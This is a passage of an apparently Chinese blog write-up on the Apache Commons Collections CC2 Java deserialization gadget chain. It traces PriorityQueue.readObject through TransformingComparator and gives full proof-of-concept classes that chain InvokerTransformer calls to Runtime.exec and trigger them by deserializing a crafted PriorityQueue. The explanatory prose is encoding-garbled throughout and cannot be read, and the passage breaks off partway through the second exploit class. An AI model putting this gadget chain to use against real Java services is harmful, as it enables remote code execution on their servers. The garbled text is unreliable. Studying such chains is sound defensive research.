<h4 id="PriorityQueue"><a href="#PriorityQueue" class="headerlink" title="PriorityQueue"></a>PriorityQueue</h4><blockquote>
<p><strong>PriorityQueue ‰ºòÂÖàÁ∫ßÈòüÂàó</strong></p>
<p><code>PriorityQueue</code> ‰ºòÂÖàÁ∫ßÈòüÂàóÊòØ<strong>Âü∫‰∫é‰ºòÂÖàÁ∫ßÂ†Ü</strong>ÁöÑ‰∏ÄÁßçÁâπÊÆäÈòüÂàó„ÄÇÂú®Êàë‰ª¨ÁÜüÁü•ÁöÑÈòüÂàóÂü∫Á°Ä‰∏äÊ∑ªÂä†ÊØîËæÉÂô®ÔºàComparatorÔºâÂäüËÉΩÔºåÊØèÊ¨°ÊèíÂÖ•ÊàñËÄÖÂà†Èô§ÂÖÉÁ¥†Êó∂Ôºå‰ºöÊåâÁÖßÊØîËæÉÂô®ËÆæÂÆöÁöÑËßÑÂàôËøõË°åÂÖÉÁ¥†ÊéíÂ∫èÁ≠âÊìç‰Ωú</p>
<p>Ôºà1Ôºâ‰∏çÂÆö‰πâÊØîËæÉÂô®Ôºå‰ΩøÁî®ÈªòËÆ§ÊØîËæÉÂô®</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example;<br><br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Myqueue</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        <span class="hljs-keyword">int</span>[] list = &#123;<span class="hljs-number">5</span>, <span class="hljs-number">7</span>, <span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">2</span>, <span class="hljs-number">8</span>, <span class="hljs-number">1</span>&#125;;<br>        PriorityQueue&lt;Integer&gt; queue = <span class="hljs-keyword">new</span> PriorityQueue&lt;Integer&gt;();<br>        <span class="hljs-comment">// ËæìÂá∫ÂéüÂßãÈòüÂàó</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i : list) &#123;<br>            System.out.print(i + <span class="hljs-string">&quot; &quot;</span>);<br>        &#125;<br>        System.out.println();<br>        <span class="hljs-comment">// ÈÄê‰∏™ÊèíÂÖ•‰ºòÂÖàÁ∫ßÈòüÂàó</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i : list) &#123;<br>            queue.add(i);<br>        &#125;<br>        <span class="hljs-comment">// ÈÄê‰∏™ËæìÂá∫‰ºòÂÖàÁ∫ßÈòüÂàó</span><br>        <span class="hljs-keyword">while</span> (!queue.isEmpty()) &#123;<br>            <span class="hljs-keyword">int</span> i = queue.remove();<br>            System.out.print(i + <span class="hljs-string">&quot; &quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/v2-408eaf857d4e79fd633d58da6ff536f0_r.jpg" srcset="/img/loading.gif" lazyload></p>
<p>ÂèØ‰ª•ÁúãÂá∫Ôºå‰ΩøÁî®ÈªòËÆ§ÁöÑÊØîËæÉÂô®ÔºåÊØèÊ¨°ÂºπÂá∫ÁöÑÂÖÉÁ¥†ÊòØÈòüÂàó‰∏≠ÊúÄÂ∞èÁöÑ„ÄÇ</p>
<p>Ôºà2ÔºâÂÆö‰πâ‰∏Ä‰∏™ÊØîËæÉÂô®Ôºå‰ªéÂ§ßÂà∞Â∞èËæìÂá∫</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example;<br><br><span class="hljs-keyword">import</span> java.util.Comparator;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Myqueue</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        <span class="hljs-keyword">int</span>[] list = &#123;<span class="hljs-number">5</span>, <span class="hljs-number">7</span>, <span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">2</span>, <span class="hljs-number">8</span>, <span class="hljs-number">1</span>&#125;;<br><span class="hljs-comment">//        PriorityQueue&lt;Integer&gt; queue = new PriorityQueue&lt;Integer&gt;();</span><br>        PriorityQueue&lt;Integer&gt; queue = <span class="hljs-keyword">new</span> PriorityQueue&lt;Integer&gt;(<span class="hljs-keyword">new</span> Comparator&lt;Integer&gt;() &#123;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">compare</span><span class="hljs-params">(Integer o1, Integer o2)</span> </span>&#123;<br>                <span class="hljs-keyword">return</span> o2 - o1;<br>            &#125;<br>        &#125;);<br>        <span class="hljs-comment">// ËæìÂá∫ÂéüÂßãÈòüÂàó</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i : list) &#123;<br>            System.out.print(i + <span class="hljs-string">&quot; &quot;</span>);<br>        &#125;<br>        System.out.println();<br>        <span class="hljs-comment">// ÈÄê‰∏™ÊèíÂÖ•‰ºòÂÖàÁ∫ßÈòüÂàó</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i : list) &#123;<br>            queue.add(i);<br>        &#125;<br>        <span class="hljs-comment">// ÈÄê‰∏™ËæìÂá∫‰ºòÂÖàÁ∫ßÈòüÂàó</span><br>        <span class="hljs-keyword">while</span> (!queue.isEmpty()) &#123;<br>            <span class="hljs-keyword">int</span> i = queue.remove();<br>            System.out.print(i + <span class="hljs-string">&quot; &quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>ËØ•ÊØîËæÉÂô®ÂÖÅËÆ∏ÂêéËÄÖÊìç‰ΩúÔºàÊèíÂÖ•ÊàñÂà†Èô§ÔºâÁöÑÂÖÉÁ¥†ÊØîÂâçËÄÖÂ§ßÔºåÊâÄ‰ª•Â§ßÁöÑÂÖÉÁ¥†ÂÖàËæìÂá∫„ÄÇ</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs text">5 7 3 6 2 8 1<br>8 7 6 5 3 2 1<br></code></pre></td></tr></table></figure>
</blockquote>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//PriorityQueue.readObject()</span><br><br><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">readObject</span><span class="hljs-params">(java.io.ObjectInputStream s)</span></span><br><span class="hljs-function">        <span class="hljs-keyword">throws</span> java.io.IOException, ClassNotFoundException </span>&#123;<br>        s.defaultReadObject();<br>        s.readInt();<br>        queue = <span class="hljs-keyword">new</span> Object[size];<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; size; i++)<br>            queue[i] = s.readObject();<br>        heapify();<br>    &#125;<br><br><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">heapify</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = (size &gt;&gt;&gt; <span class="hljs-number">1</span>) - <span class="hljs-number">1</span>; i &gt;= <span class="hljs-number">0</span>; i--)<br>            siftDown(i, (E) queue[i]);<br>    &#125;<br><br><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">siftDown</span><span class="hljs-params">(<span class="hljs-keyword">int</span> k, E x)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (comparator != <span class="hljs-keyword">null</span>)<br>        siftDownUsingComparator(k, x);<br>    <span class="hljs-keyword">else</span><br>        siftDownComparable(k, x);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">siftDownUsingComparator</span><span class="hljs-params">(<span class="hljs-keyword">int</span> k, E x)</span> </span>&#123;<br>        <span class="hljs-keyword">int</span> half = size &gt;&gt;&gt; <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">while</span> (k &lt; half) &#123;<br>            <span class="hljs-keyword">int</span> child = (k &lt;&lt; <span class="hljs-number">1</span>) + <span class="hljs-number">1</span>;<br>            Object c = queue[child];<br>            <span class="hljs-keyword">int</span> right = child + <span class="hljs-number">1</span>;<br>            <span class="hljs-keyword">if</span> (right &lt; size &amp;&amp;<br>                comparator.compare((E) c, (E) queue[right]) &gt; <span class="hljs-number">0</span>)<br>                c = queue[child = right];<br>            <span class="hljs-keyword">if</span> (comparator.compare(x, (E) c) &lt;= <span class="hljs-number">0</span>)<br>                <span class="hljs-keyword">break</span>;<br>            queue[k] = c;<br>            k = child;<br>        &#125;<br>        queue[k] = x;<br>    &#125;<br></code></pre></td></tr></table></figure>

<p><code>queue[i]=s.readObject();</code>ÈÇ£‰πà<code>writeObject()</code>ÂÜôÂÖ•‰∫ÜÂØπÂ∫îÁöÑÂÜÖÂÆπ</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">writeObject</span><span class="hljs-params">(java.io.ObjectOutputStream s)</span></span><br><span class="hljs-function">        <span class="hljs-keyword">throws</span> java.io.IOException </span>&#123;<br>        s.defaultWriteObject();<br>        s.writeInt(Math.max(<span class="hljs-number">2</span>, size + <span class="hljs-number">1</span>));<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; size; i++)<br>            s.writeObject(queue[i]);<br>    &#125;<br></code></pre></td></tr></table></figure>

<h4 id="TransformingComparator"><a href="#TransformingComparator" class="headerlink" title="TransformingComparator"></a>TransformingComparator</h4><p>‰ªé<code>readObject</code>ÁªßÁª≠ÂæÄ‰∏ãÁúãÔºåÂú®<code>siftDown()</code>‰∏≠ÔºåÊàë‰ª¨ÈúÄË¶ÅËøõÂÖ•<code>siftDownUsingComparator</code>(Âõ†‰∏∫ cc2 ‰∏≠‰ΩøÁî®‰∫Ü<code>TransformingComparator.compare()</code>Êù•Ëß¶ÂèëÔºå<code>comparator.compare(x, (E) c)</code>Âà§Êñ≠ÈáåÁöÑËøô‰∏™Ë∞ÉÁî®Â∞±Á¨¶Âêà‰∫Ü)</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">TransformingComparator</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Transformer&lt;? <span class="hljs-keyword">super</span> I, ? extends O&gt; transformer)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>(transformer, ComparatorUtils.NATURAL_COMPARATOR);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">TransformingComparator</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Transformer&lt;? <span class="hljs-keyword">super</span> I, ? extends O&gt; transformer,</span></span><br><span class="hljs-params"><span class="hljs-function">                                  <span class="hljs-keyword">final</span> Comparator&lt;O&gt; decorated)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.decorated = decorated;<br>        <span class="hljs-keyword">this</span>.transformer = transformer;<br>    &#125;<br><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">compare</span><span class="hljs-params">(<span class="hljs-keyword">final</span> I obj1, <span class="hljs-keyword">final</span> I obj2)</span> </span>&#123;<br>        <span class="hljs-keyword">final</span> O value1 = <span class="hljs-keyword">this</span>.transformer.transform(obj1);<br>        <span class="hljs-keyword">final</span> O value2 = <span class="hljs-keyword">this</span>.transformer.transform(obj2);<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>.decorated.compare(value1, value2);<br>    &#125;<br></code></pre></td></tr></table></figure>

<p>‰∫éÊòØÂú®<code>PriorityQueue queue = new PriorityQueue(1,transformingComparator);</code>‰º†ÂÖ•ÁöÑ<code>comparator</code>Â∞±‰∏∫<code>TransformingComparator</code>ÔºåË∞ÉÁî®Âà∞<code>comparator.compare(x, (E) c)</code>Â∞±ËÉΩ RCE</p>
<p>ÂæàÁÜüÊÇâÔºåËøôÊòØÊù•Ëá™‰∫é cc1 ÁöÑÂêéÂçäÊÆµÈìæÔºåËÄå‰∏î<code>transformer</code>ÂèØÊéßÔºåpoc Âª∂ÈïøÂ¶Ç‰∏ãÂ¶Ç‰∏ãÔºö</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> CommonsCollections.CC2;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC2Ez</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(<span class="hljs-keyword">new</span> Transformer[]&#123;<br>                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-keyword">null</span>, <span class="hljs-keyword">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;),<br>                <span class="hljs-keyword">new</span> ConstantTransformer(<span class="hljs-number">1</span>)<br>        &#125;);<br><br>        TransformingComparator transformingComparator = <span class="hljs-keyword">new</span> TransformingComparator(chainedTransformer);<br><br>        PriorityQueue queue = <span class="hljs-keyword">new</span> PriorityQueue(transformingComparator);<br><span class="hljs-comment">//        PriorityQueue queue = new PriorityQueue(1,transformingComparator);</span><br>        queue.add(<span class="hljs-number">1</span>);<br>        queue.add(<span class="hljs-number">2</span>);<br><br>        ByteArrayOutputStream baos = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(baos);<br>        oos.writeObject(queue);<br>        oos.close();<br><br>        ByteArrayInputStream bais = <span class="hljs-keyword">new</span> ByteArrayInputStream(baos.toByteArray());<br>        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(bais);<br>        ois.readObject();<br>        ois.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>È¶ñÂÖàÊòØ<code>TransformingComparator</code>Â§ÑÁêÜ‰∫Ü<code>chainedTransformer</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">PriorityQueue queue = <span class="hljs-keyword">new</span> PriorityQueue(<span class="hljs-number">1</span>);<span class="hljs-comment">//‰∏∫‰ªÄ‰πà‰º†ÂÖ•1Ôºå‰πüÂèØ‰ª•‰º†ÂÖ•PriorityQueue(1,transformingComparator)</span><br>queue.add(<span class="hljs-number">1</span>);<br>queue.add(<span class="hljs-number">2</span>);<span class="hljs-comment">//‰∏∫‰ªÄ‰πàË¶ÅÊ∑ªÂä†‰∏§‰∏™ÂÖÉÁ¥†</span><br></code></pre></td></tr></table></figure>

<p>Á¨¨‰∏Ä‰∏™ÈóÆÈ¢òÔºåÁúãÂÖ∂ÊûÑÈÄ†ÊñπÊ≥ïÔºåÊúÄÂêéÈÉΩÊòØ<code>this</code>ÊåáÂêë‰∏Ä‰∏™ÊûÑÈÄ†ÊñπÊ≥ï</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">PriorityQueue</span><span class="hljs-params">(<span class="hljs-keyword">int</span> initialCapacity,</span></span><br><span class="hljs-params"><span class="hljs-function">                     Comparator&lt;? <span class="hljs-keyword">super</span> E&gt; comparator)</span> </span>&#123;<br>    <span class="hljs-comment">// Note: This restriction of at least one is not actually needed,</span><br>    <span class="hljs-comment">// but continues for 1.5 compatibility</span><br>    <span class="hljs-keyword">if</span> (initialCapacity &lt; <span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> IllegalArgumentException();<br>    <span class="hljs-keyword">this</span>.queue = <span class="hljs-keyword">new</span> Object[initialCapacity];<br>    <span class="hljs-keyword">this</span>.comparator = comparator;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>ËÄåÊàë‰ª¨‰øùËØÅ‰∏Ä‰∏™ÂèÇÊï∞‰∏çÂ∞è‰∫é 1Ôºå‰πüÂ∞±ÊòØÊàêÂëòÂèòÈáèËÉΩËµãÂà∞ÂÄºÂ∞±Ë°åÔºå‰∏çËµãÂÄºÁªèËøá this ËΩ¨Êç¢Âêé‰º†ËøõÂéª<code>DEFAULT_INITIAL_CAPACITY=11</code>‰πüÂ§ß‰∫é 1</p>
<p>Á¨¨‰∫å‰∏™ÈóÆÈ¢ò</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">add</span><span class="hljs-params">(E e)</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> offer(e);<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">offer</span><span class="hljs-params">(E e)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (e == <span class="hljs-keyword">null</span>)<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> NullPointerException();<br>        modCount++;<br>        <span class="hljs-keyword">int</span> i = size;<br>        <span class="hljs-keyword">if</span> (i &gt;= queue.length)<br>            grow(i + <span class="hljs-number">1</span>);<br>        size = i + <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">if</span> (i == <span class="hljs-number">0</span>)<br>            queue[<span class="hljs-number">0</span>] = e;<br>        <span class="hljs-keyword">else</span><br>            siftUp(i, e);<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;<br>    &#125;<br></code></pre></td></tr></table></figure>

<p><code>add</code>‰∏§Ê¨°Âêé<code>size = i + 1;</code>ÔºåÊ≠§Êó∂<code>size=2</code>ÔºåÂú®<code>heapify#for</code>ÈÄªËæëÊâçËÉΩËøõÂéª(<code>size &gt;&gt;&gt; 1 = 0</code>)ÔºõÂê¶Âàô<code>1 &gt;&gt;&gt; 1 = 0</code></p>
<p>Ê≠§Êó∂ËÉΩÂ§üË∞ÉÁî®<code>siftDown</code>ÊñπÊ≥ï‰∫ÜÔºåÊ†πÊçÆ‰∏äÈù¢ÁöÑÂàÜÊûêÔºåË¶ÅË∞ÉÁî®<code>siftDownUsingComparator</code>ÔºåÊª°Ë∂≥ÈùûÁ©∫ÔºåÊ≠§Êó∂‰º†ÂÖ•<code>comparator</code>‰∏∫<code>TransformingComparator</code>Âç≥ÂèØ</p>
<p>‰ΩÜËøô‰∏™ poc Âú®ÁºñÂÜôÊó∂‰ºöËß¶ÂèëÔºåÂèØ‰ª•ËßÑÈÅøËøô‰∏™ÈóÆÈ¢òÔºö‰∏çÁõ¥Êé•ÂæÄ<code>PriorityQueue</code>ÊûÑÈÄ†ÊñπÊ≥ï‰º†ÂÖ•<code>TransformingComparator</code>ÔºåËÄåÊòØÂÖàËÆ©ÂÖ∂‰º†ÂÖ•ÂÖ∂‰∏≠‰∏Ä‰∏™ÊûÑÈÄ†ÊñπÊ≥ï‚Äî‚ÄîÁΩÆÁ©∫<code>Comparator</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">PriorityQueue</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">this</span>(DEFAULT_INITIAL_CAPACITY, <span class="hljs-keyword">null</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">PriorityQueue</span><span class="hljs-params">(<span class="hljs-keyword">int</span> initialCapacity)</span> </span>&#123;<br>    <span class="hljs-keyword">this</span>(initialCapacity, <span class="hljs-keyword">null</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>ÈöèÂêé add Ê∑ªÂä†‰∏§Ê¨°ÂÖÉÁ¥†ÂêéÈÄöËøáÂèçÂ∞ÑÊõøÊç¢<code>Comparator</code>‰∏∫<code>TransformingComparator</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> CommonsCollections.CC2;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC2Ez</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(<span class="hljs-keyword">new</span> Transformer[]&#123;<br>                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-keyword">null</span>, <span 